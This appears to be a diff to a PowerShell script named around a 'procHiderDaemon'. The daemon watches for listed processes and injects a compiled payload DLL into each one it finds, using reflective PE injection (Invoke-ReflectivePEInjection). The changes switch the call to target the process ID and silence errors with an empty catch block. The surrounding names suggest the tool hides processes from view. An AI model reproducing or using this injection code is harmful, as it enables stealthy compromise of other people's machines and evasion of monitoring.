@@ -6,7 +6,7 @@ function writeFiles
     $ofs=','
     [string]$i|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Force
     [string]$n|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
-    $(Split-Path $PSScriptRoot)+'\MainFile\EasyHook'+$(if([System.Environment]::Is64BitOperatingSystem){'64'} else {'32'}) +'.dll'|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Appen
+    
 }
 
 function isElevated
@@ -82,17 +82,21 @@ function procHiderDaemon
                     $nextLivingFrobProc+=$proc.ID
                     if($livingFrobiddenProcesses -notcontains $proc.ID)
                     {
-                        Start-Sleep -m 200
+                        #Start-Sleep -m 200
                         if(Get-Process -Id $proc.ID -ErrorAction Ignore)
                             {
                             Write-Host $proc.Name is alive! pID =  $proc.ID
-                            "$($proc.Name) is x$(if(is64bit($proc)) {'64'} else {'86'})"
                             $targetDLLpath=(Split-Path $PSScriptRoot)+'\BuildOutput\x'+$(if([System.Environment]::Is64BitOperatingSystem){'64'} else {'86'}) +'Payload.dll'
-                            $targetDLLpath
                             $DLLbytes = [System.IO.File]::ReadAllBytes($targetDLLpath)
-                            $DLLbytes.Count
-                            .\Invoke-ReflectivePEInjection2.ps1
-                            Invoke-ReflectivePEInjection -FuncReturnType Void -PEPath $targetDLLpath -ProcName $proc.Name # -ProcId $proc.ID
+                            . $PSScriptRoot"\Invoke-ReflectivePEInjection.ps1"
+                            try
+                            {
+                            Invoke-ReflectivePEInjection -PEBytes $DLLbytes -ProcId $proc.ID
+                            }
+                            catch{}
+                            "$($proc.Name) is x$(if(is64bit($proc)) {'64'} else {'86'})"
+
+
                             }
                     
                     } 
@@ -103,4 +107,4 @@ function procHiderDaemon
     }
 }
 
-procHiderDaemon -i $i -x $x -n $n
+procHiderDaemon
